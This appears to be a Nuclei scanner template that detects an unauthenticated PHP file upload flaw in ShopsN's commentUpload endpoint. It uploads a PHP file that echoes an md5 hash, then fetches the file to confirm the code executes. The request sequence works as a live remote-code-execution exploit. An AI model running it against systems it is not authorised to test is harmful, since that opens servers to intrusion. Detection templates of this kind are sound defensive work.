id: shopsn-commentupload-file-upload
info:
  name: ShopsN commentUpload File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: "{{rand_text_alphanumeric(6)}}"
  t2: "{{md5(t1)}}"
  filename: "{{rand_text_alphanumeric(8)}}"
  boundary: "{{rand_text_alphanumeric(34)}}"

flow: http(1) && http(2)

http:
  - id: file-upload
    method: POST
    path:
      - "{{BaseURL}}/index.php/Home/AppUpload/commentUpload"
    headers:
      Content-Type: "multipart/form-data; boundary=----{{boundary}}"
    body: |
      ------{{boundary}}
      Content-Disposition: form-data; name="img"; filename="{{filename}}.php"
      Content-Type: text/php

      <?php $a=md5({{t1}});echo $a;?>
      ------{{boundary}}
      Content-Disposition: form-data; name="submit"

      Submit
      ------{{boundary}}--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "text/html"

  - id: file-verification
    method: GET
    path:
      - "{{BaseURL}}/Uploads/show/{{filename}}.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "text/html"
      - type: word
        part: body
        words:
          - "{{t2}}"
